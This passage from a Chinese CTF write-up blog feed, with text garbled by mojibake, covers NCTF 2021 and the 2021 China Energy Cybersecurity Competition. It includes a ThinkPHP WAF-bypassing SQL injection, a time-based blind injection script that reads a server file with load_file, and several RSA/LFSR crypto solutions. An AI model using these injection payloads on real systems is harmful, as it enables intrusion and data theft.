/&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span>)&#123;</span><br><span class="line">db(<span class="string">&#x27;m1saka&#x27;</span>)-&gt;insert([<span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;å•Šå¯¹å¯¹å¯¹&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;è¯´ä»€ä¹ˆæˆ‘å°±å¼€æ‘†&#x27;</span>;<span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§ThinkPHPæ§åˆ¶å™¨è¯­æ³•ï¼ŒGETæ–¹å¼ä¼ å…¥ <code>username</code> å‚æ•°å€¼ï¼ˆæœ¬åœ°éƒ¨ç½²ï¼Œå¼€å¯debugè°ƒè¯•åŠŸèƒ½æµ‹è¯•ï¼‰ï¼š</p><p> <code>http://129.211.173.64:8086/public/index.php/index/m1saka_m1yuu/index?username=xxx</code> æ­£å¸¸å›æ˜¾ <code>å•Šå¯¹å¯¹å¯¹</code>ã€‚</p><p>åç»­æ§åˆ¶ <code>username</code> å‚æ•°å€¼ï¼Œç»•è¿‡wafï¼Œå®ç°insertæ³¨å…¥ï¼š</p><p><code>http://129.211.173.64:8086/public/index.php/index/m1saka_m1yuu/index?username[0]=exp&amp;username[1]=if((substr((select(&quot;admin&quot;)),16,1)=&quot;n&quot;),sleep(3),0)</code></p><p>æ›¿æ¢ä¸ºæ—¶é—´ç›²æ³¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://129.211.173.64:8086/public/index.php/index/m1saka_m1yuu/index?username[0]=exp&amp;username[1]=&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&#x27;if((ascii(substr((select(load_file(&quot;/var/www/html/ffllaagg.php&quot;))),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>),sleep(0.6),0)&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url + payload,timeout=<span class="number">0.5</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagï¼š<code>nctf&#123;m1saka_wanna_marry_liyuu_&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="Hello-ã›ã‹ã„"><a href="#Hello-ã›ã‹ã„" class="headerlink" title="Hello ã›ã‹ã„"></a>Hello ã›ã‹ã„</h3><blockquote><p>æ¬¢è¿æ¥åˆ°NCTF-é€†å‘å·¥ç¨‹(Reverse Engineering)<br>è¿™é‡Œå¯èƒ½æœ‰ä½ éœ€è¦çš„å·¥å…·:<br>ida pro 7.6 :é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1bV2HjBBX0bwwtzORqhErOg">https://pan.baidu.com/s/1bV2HjBBX0bwwtzORqhErOg</a> æå–ç ï¼šo49x</p></blockquote><p>IDAæ‰“å¼€ï¼ŒæŸ¥æ‰¾å­—ç¬¦ä¸²ï¼Œå‘ç°flagï¼š<code>NCTF&#123;We1come_2_Reverse_Engineering&#125;</code>ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ¯”èµ›æ—¶é—´ï¼š2021.11.27 9:00-2021.11.28 21:00&lt;/li&gt;
&lt;li&gt;æ¯”èµ›åŒºåˆ†æ ¡å†…æ ¡å¤–ï¼Œæ¯”èµ›ç»“æŸåç»“ç®—åˆ†åˆ«æ’åï¼Œæ¯”èµ›æ—¶æ’è¡Œæ¦œä¸åŒºåˆ†&lt;/li&gt;
&lt;li&gt;æ³¨å†Œé˜Ÿä¼ç™»é™†åï¼Œè¯·åœ¨Profileé¡µé¢ç»‘å®šé˜Ÿä¼æˆå‘˜ä¿¡æ¯&lt;/li</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021èµ›" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2021å¹´ä¸­å›½èƒ½æºç½‘ç»œå®‰å…¨å¤§èµ›</title>
    <link href="https://lazzzaro.github.io/2021/10/15/match-2021%E5%B9%B4%E4%B8%AD%E5%9B%BD%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2021/10/15/match-2021%E5%B9%B4%E4%B8%AD%E5%9B%BD%E8%83%BD%E6%BA%90%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2021-10-15T11:39:32.000Z</published>
    <updated>2021-10-16T16:00:36.995Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>èƒ½æºç½‘ç»œå®‰å…¨æ˜¯å›½å®¶å®æ–½èƒ½æºå®‰å…¨æˆ˜ç•¥çš„é‡è¦ä¿éšœã€‚åœ¨å›½å®¶â€œç¢³è¾¾å³°ã€ç¢³ä¸­å’Œâ€æˆ˜ç•¥ç›®æ ‡å¼•é¢†ä¸‹ï¼Œä»¥æ–°èƒ½æºä¸ºä¸»ä½“çš„æ–°å‹ç”µåŠ›ç³»ç»Ÿæ­£åŠ å¿«å»ºè®¾ï¼Œèƒ½æºä¼ä¸šæ•°å­—åŒ–è½¬å‹åŠ é€Ÿå‘å±•ï¼Œæˆ‘å›½èƒ½æºç½‘ç»œå®‰å…¨é£é™©æŒ‘æˆ˜ä»å°†æŒç»­å¢å¤§ã€‚ä¸ºæ·±å…¥è´¯å½»ä¹ è¿‘å¹³æ€»ä¹¦è®°å…³äºåˆ‡å®åšå¥½å›½å®¶å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½å®‰å…¨é˜²æŠ¤çš„é‡è¦æŒ‡ç¤ºç²¾ç¥ï¼Œè½å®ã€Šå…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½å®‰å…¨ä¿æŠ¤æ¡ä¾‹ã€‹çš„æœ‰å…³è¦æ±‚ï¼Œå…¨é¢æå‡æˆ‘å›½èƒ½æºè¡Œä¸šç½‘ç»œå®‰å…¨æ°´å¹³ï¼ŒåŠ å¼ºèƒ½æºç½‘ç»œå®‰å…¨äººæ‰åŸ¹å…»ä¸æŠ€æœ¯äº¤æµï¼ŒåŠ å¿«æ„å»ºâ€œæ¸…æ´ä½ç¢³ã€å®‰å…¨é«˜æ•ˆâ€çš„èƒ½æºä½“ç³»ï¼Œä¸­å›½èƒ½æºç ”ç©¶ä¼šå®šäº2021å¹´9ï½11æœˆä¸¾åŠ2021å¹´ä¸­å›½èƒ½æºç½‘ç»œå®‰å…¨å¤§èµ›æš¨ä¸­å›½èƒ½æºç½‘ç»œä¸æ•°æ®å®‰å…¨å¤§ä¼šã€‚</p><hr><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">e1=835967807536519622934604405063</span><br><span class="line">c1=19448632793065985668242563682199317331128016014251864412392395153156562893115782681369855239641432012330044885183775431340880864508525060098643116187637108122191428830624874050932679396567720373709957047168752779394888657259608530625932344667774681955326741127517701466048803352951916658946766088235132266647346283962586227793525978969088779182627558192227142187329292061143062946064902843366826489113664325053426251453100871248523117087970964024906746251860275872790437361291110328641349591771411040734747357045665591626240405636425026415496457159149035136648895848881873209825942855217824281430061391533815396720710</span><br><span class="line">n1=31046255108437029118905717148957090183329402036332840118962561815659089322022943549665387220463210707021593218518105030590365349413133234315740524564946375831281241151522645514083464163544922980295642762649110433281286369663828432475929249392310436766745697134397285170617697641192886069854519440924834245392651292279051754654969060722850419325204713884858202922636556579391101638013190488822298434718076867399175291027281809145262948338325719474386917864777538133724445628651824987863715906880390487762744557151375265257554729150403617490110959353085963322495483098493865964611448790100520199013314219751750640119863</span><br><span class="line">e2=885003184250422219085124964981</span><br><span class="line">c2=4218572471345165732934998703714571105894271274075665866974516797649450984700474173358118625328090066638656820575859730131413953210153819184549819168514892245621740892736123987170805386681559030845204022985227261362626648144331552748679698050998013623282010514985589856239604197479795560729961306447338695058204615382433558388308701652353732815262119876165416607974763600968466766575623592583217035606726939874922507643990533020940476008390177733659865545258122624949624127261940887766555348528919909233817222490816887166626563144543878852122865972078511391354912133571091812293541668653349538816840275188432483945400</span><br><span class="line">n2=31046255108437029118905717148957090183329402036332840118962561815659089322022943549665387220463210707021593218518105030590365349413133234315740524564946375831281241151522645514083464163544922980295642762649110433281286369663828432475929249392310436766745697134397285170617697641192886069854519440924834245392651292279051754654969060722850419325204713884858202922636556579391101638013190488822298434718076867399175291027281809145262948338325719474386917864777538133724445628651824987863715906880390487762744557151375265257554729150403617490110959353085963322495483098493865964611448790100520199013314219751750640119863</span><br></pre></td></tr></table></figure></blockquote><p>$n_1=n_2$ï¼ŒRSAå…±æ¨¡æ”»å‡»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line"><span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">g, y, x = egcd(b % a, a)</span><br><span class="line"><span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line">n = <span class="number">31046255108437029118905717148957090183329402036332840118962561815659089322022943549665387220463210707021593218518105030590365349413133234315740524564946375831281241151522645514083464163544922980295642762649110433281286369663828432475929249392310436766745697134397285170617697641192886069854519440924834245392651292279051754654969060722850419325204713884858202922636556579391101638013190488822298434718076867399175291027281809145262948338325719474386917864777538133724445628651824987863715906880390487762744557151375265257554729150403617490110959353085963322495483098493865964611448790100520199013314219751750640119863</span></span><br><span class="line">e1 = <span class="number">835967807536519622934604405063</span></span><br><span class="line">c1 = <span class="number">19448632793065985668242563682199317331128016014251864412392395153156562893115782681369855239641432012330044885183775431340880864508525060098643116187637108122191428830624874050932679396567720373709957047168752779394888657259608530625932344667774681955326741127517701466048803352951916658946766088235132266647346283962586227793525978969088779182627558192227142187329292061143062946064902843366826489113664325053426251453100871248523117087970964024906746251860275872790437361291110328641349591771411040734747357045665591626240405636425026415496457159149035136648895848881873209825942855217824281430061391533815396720710</span></span><br><span class="line">e2 = <span class="number">885003184250422219085124964981</span></span><br><span class="line">c2 = <span class="number">4218572471345165732934998703714571105894271274075665866974516797649450984700474173358118625328090066638656820575859730131413953210153819184549819168514892245621740892736123987170805386681559030845204022985227261362626648144331552748679698050998013623282010514985589856239604197479795560729961306447338695058204615382433558388308701652353732815262119876165416607974763600968466766575623592583217035606726939874922507643990533020940476008390177733659865545258122624949624127261940887766555348528919909233817222490816887166626563144543878852122865972078511391354912133571091812293541668653349538816840275188432483945400</span></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">s1 = - s1</span><br><span class="line">c1 = gp.invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">s2 = - s2</span><br><span class="line">c2 = gp.invert(c2, n)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n) % n</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#666c61677b36323462306666352d326436642d313165632d623438622d6463613930343938613264627d</span></span><br><span class="line"><span class="comment">#b&#x27;flag&#123;624b0ff5-2d6d-11ec-b48b-dca90498a2db&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>FLAG:</strong> <code>flag&#123;624b0ff5-2d6d-11ec-b48b-dca90498a2db&#125;</code></p><p>â€‹    </p><h3 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h3><blockquote><p>31332b353d3f3f3f2d2d2d2d7a6d6a74706d3838757366677a6d797474736467746d65697a6c6c74787a6d657a61646a766d6f66757365677262776b7a77666a7a61796f7a646d75373d3d3d</p></blockquote><p>å…ˆè½¬hexå¾—åˆ° <code>13+5=???----zmjtpm88usfgzmyttsdgtmeizlltxzmezadjvmofusegrbwkzwfjzayozdmu7===</code>ï¼Œ</p><p><code>zmjtpm88usfgzmyttsdgtmeizlltxzmezadjvmofusegrbwkzwfjzayozdmu7===</code> æ ¹æ®æ— æ•°å­—1å’Œç­‰å·ç‰¹å¾ï¼ŒçŒœæµ‹æ˜¯è½¬å°å†™çš„base32ï¼›</p><p>è½¬å›å¤§å†™ï¼Œç”±å‰é¢æç¤º <code>13+5</code>ï¼Œrot13+base32å¾—åˆ° <code>fladÃ¥.Ã™..Ã….Ã.Ã•.Ã.ÃŒÃ…....ÃˆÃ¥.ÃˆÃ¤Ã...Ã•..Ã‰Ã¾</code> å‡ºç°flagå¤´ï¼›</p><p>ç”±äº <code>base32(&#39;flag&#123;&#39;)=MZWGCZ33</code>ï¼Œæ•°å­—ä¸ºrot5ï¼Œå¯†æ–‡è¿˜åŸä¸º <code>MZWGCZ33HFSTMZLGGFQTGZRVMYYGKMZRMNQWIZBSHFRTEOJXMJSWMNLBMQZH2===</code>ï¼Œ</p><p>base32 è§£ç å¾— <code>flag&#123;9e6ef1a3f5f0e31cadd29c297bef5ad2&#125;</code>ã€‚</p><p><strong>FLAG:</strong> <code>flag&#123;9e6ef1a3f5f0e31cadd29c297bef5ad2&#125;</code></p><p>â€‹    </p><h3 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h3><blockquote><p>æ‚ä¸ƒæ‚å…«å¯†ç çš„æ··åˆä½“</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span>(<span class="params">status,mask</span>):</span></span><br><span class="line">    newbit = (status &lt;&lt; <span class="number">1</span>) &amp; (<span class="number">2</span>**<span class="number">33</span>-<span class="number">1</span>)</span><br><span class="line">    i=(status&amp;mask)&amp;(<span class="number">2</span>**<span class="number">33</span>-<span class="number">1</span>)</span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    newbit^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (newbit,lastbit)</span><br><span class="line"></span><br><span class="line">status=<span class="number">1</span></span><br><span class="line">mask = <span class="number">0b10110001110010011100100010110101</span></span><br><span class="line"></span><br><span class="line">m = <span class="string">b&quot;flag&#123;*************&#125;&quot;</span></span><br><span class="line">num = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">binp = <span class="built_in">bin</span>(p)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">c = (<span class="built_in">pow</span>(num, e, n))</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;enc2&quot;</span>, <span class="string">&quot;w+&quot;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(n)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(c)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;enc&quot;</span>,<span class="string">&quot;w+&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">760</span>):</span><br><span class="line">    curnum = <span class="built_in">int</span>(binp[i])</span><br><span class="line">    (status,out)=lfsr(status,mask)</span><br><span class="line">    f.write(<span class="built_in">chr</span>(curnum ^ out))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></blockquote><p>LFSR + RSAé«˜ä½pæ³„éœ²æ”»å‡»ã€‚</p><p>å…ˆæ¨¡æ‹ŸLFSRæ±‚å‡º760ç»„ <code>out</code> 01å€¼ï¼Œç»“åˆ<code>enc</code>æ–‡ä»¶ä¸­01å¯†æ–‡ï¼Œå¼‚æˆ–è¿˜åŸ $p$ çš„é«˜760äºŒè¿›åˆ¶ä½ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span>(<span class="params">status,mask</span>):</span></span><br><span class="line">    newbit = (status &lt;&lt; <span class="number">1</span>) &amp; (<span class="number">2</span>**<span class="number">33</span>-<span class="number">1</span>)</span><br><span class="line">    i=(status&amp;mask)&amp;(<span class="number">2</span>**<span class="number">33</span>-<span class="number">1</span>)</span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    newbit^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (newbit,lastbit)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">status = <span class="number">1</span></span><br><span class="line">mask = <span class="number">0b10110001110010011100100010110101</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;00000100000001010001010101010000000000010000010001010000010100000001000000000101010100010001000000000000010001000000010000000001010000000101000000000000000001000100010001000101010001010101010101000101000101000000010001010001000000000001010001010100010001000000000000010000010001000000000000000000000000010101000000010101000100010001000100010101010101010001010000000100000100000101000101010001010101000101000001010000010001000100000001000101010100010100010000000101000001000101000001000101000100010100000100000101000100000100000100000000010000010100010001010100010000000100000001000001010000000000000001010101000101010100010100010001010101000100010101000100010001010101010001010000000101010001000100000000000101000001010001000101000001000100010101010001000001010001010001010101010001000100010101000001000001000100010000000100000001010001010000000101010000010001000000010000010100000000010001000001010100010101010101000000010100010100010101000000010001010101010001010100000001010001000101000100000000000100010100000001010101000100010100010100010000000100010101000001000001010001000100010001010001000101010101000000000000010100000001000000000001010000010100000001000100000000000000000101010101000000000000010001000100010001000001000100000101000101000101010101010001000001000101000101000000010100000001010001000100010101000001000101010100010001010100010100010000000001000001010000000001010001000001010000010000000001000101000100010001010101010101000101010101000000000000000101010001010001010100010100000000000000000100010101&#x27;</span>))</span><br><span class="line"><span class="comment">#print(c)</span></span><br><span class="line"></span><br><span class="line">pp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">760</span>):</span><br><span class="line">(status,out) = lfsr(status,mask)</span><br><span class="line">pp += <span class="built_in">str</span>(c[i]^out)</span><br><span class="line"></span><br><span class="line">pp = <span class="built_in">int</span>(pp, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(pp)</span><br><span class="line"></span><br><span class="line"><span class="comment">#6064523798049644277925701126806650606472211004362096137261922023539261533931159712229993784486900304494092698035668254711607734547323493716579247168129613825017402250081444943555723771998431425098683590600454956058175183022718975</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨coppersmithæ”»å‡»æ–¹æ³•ï¼Œè¿›è¡Œå·²çŸ¥ $p$ é«˜ä½æ”»å‡»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">20929902170717676951934620006433003604730678640645007075637305655990838672444304031857412581445836654784941618387885677741424195646067710979291690749949226354601059943673546892769474380805413381477209725509187761202889007557157174009816759858206190915193870770303140668513899480840368042056977078850633645939996806974754076338446182094408033833859119883893893710390855924917625801146138452249766835457952331243832878453385608344187234621288871394907683956060567710199168220435234555727645472494418988488158424284566395402382371954247354264148359024995803494283148151292240772247688313806712633140618802681063347059301</span></span><br><span class="line">p4 = <span class="number">6020793003600505515657431119157212393365966944447518390323900168965824649782228689680274668164250924439790546808885513956693311045291390596152861670602514965058376230082977010070282487901715757886308848763512028412503942684262007</span></span><br><span class="line">e =  <span class="number">65537</span></span><br><span class="line">pbits = <span class="number">1024</span></span><br><span class="line">kbits = pbits - p4.nbits()</span><br><span class="line">p4 = p4 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p4</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line"><span class="keyword">if</span> roots:        </span><br><span class="line">p = p4+<span class="built_in">int</span>(roots[<span class="number">0</span>]) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p = &quot;</span>+<span class="built_in">str</span>(p))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q = &quot;</span>+<span class="built_in">str</span>(n//p))</span><br><span class="line">    </span><br><span class="line"><span class="comment">#p = 178473011392593598505298598344099528115548451492933270114904463603611584603267214985220850730034624404463453138131960336680355670323048351300133942965805079196071421536335378530449908306426271314462228131670026772855194671868525313446301101494560326641880067330258886334198095183772143790227948133817520438209</span></span><br><span class="line"><span class="comment">#q = 117272085047511228904591997419599628624189308881609369935452126803320898264759343424520375607941703744925707366699154133792983045245930090675456846087494137892328143697198606928970884892931890016115977464725544377659165461842270186367403846042556245975180328562734594014884754292825059517252004778580410644389</span></span><br></pre></td></tr></table></figure><p>æœ€åå¸¸è§„RSAè§£ $m$ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">178473011392593598505298598344099528115548451492933270114904463603611584603267214985220850730034624404463453138131960336680355670323048351300133942965805079196071421536335378530449908306426271314462228131670026772855194671868525313446301101494560326641880067330258886334198095183772143790227948133817520438209</span></span><br><span class="line">q = <span class="number">117272085047511228904591997419599628624189308881609369935452126803320898264759343424520375607941703744925707366699154133792983045245930090675456846087494137892328143697198606928970884892931890016115977464725544377659165461842270186367403846042556245975180328562734594014884754292825059517252004778580410644389</span></span><br><span class="line">n = p * q</span><br><span class="line">fn = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">12381638589055841139447839302795029653843309313978198727914736718245700098003130043532117734105184556347388175236916768083364314767482249333410320774565764577094924964983543424785959666191716662886118558538365503080964047183533841342232120086245448689762948846598689811062301086591078119426971029385906936610191899748366808606594184238261341160458933596780268681004577561284530512291876043524269456261191856680575840859843145591670082313114482813697656520320677074240863479192424768989294287655231041605257414144367688426659163486702611196512549549115716697786311455783534600599360245502989232358699920442842821956230</span></span><br><span class="line">d = gmpy2.invert(e, fn)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;flag&#123;th1s_ls_4_eZ_quEST1on&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>FLAG:</strong> <code>flag&#123;th1s_ls_4_eZ_quEST1on&#125;</code></p><p>â€‹    </p><h3 id="NumberGame"><a href="#NumberGame" class="headerlink" title="NumberGame"></a>NumberGame</h3><blockquote><p>æ•°å­—çš„æ¸¸æˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e=65537</span><br><span 